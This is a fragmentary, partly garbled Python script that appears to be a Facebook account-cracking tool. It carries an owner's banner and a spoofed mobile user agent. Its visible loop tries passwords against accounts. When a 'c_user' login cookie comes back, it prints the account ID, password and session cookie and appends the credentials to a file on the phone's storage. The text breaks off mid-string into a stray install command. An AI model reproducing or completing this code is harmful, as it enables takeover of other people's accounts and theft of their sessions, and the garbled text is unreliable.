...
ha = current.day
today = date.today()
#Adritah2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mAdritah')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-Adritah/1.2.0 OPN-B'
...
\033[1;92m ..:::::..::........:::..:::::..::....:::::..:::::..:::::..::
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97mAdritah \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97mAdritah Jannat \033[1;92m     |   
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio Adritah_OK.mp3")
                print('\033[1;92m[Adritah-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/Adritah-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mAdritah","\x1b[1;92mAdritah","\x1b[1;93mAdritah","\x1b[1;94mAdritah","\x1b[1;95mAdritah","\x1b[1;96mAdritah","\x1b[1;97mAdritah","\x1b[1;91mAdritah","\x1b[1;92mAdritah","\x1b[1;93mAdritah","\x1b[1;94mAdritah","\x1b[1;95mAdritah","\x1b[1;96mAdritahapt install git python -y
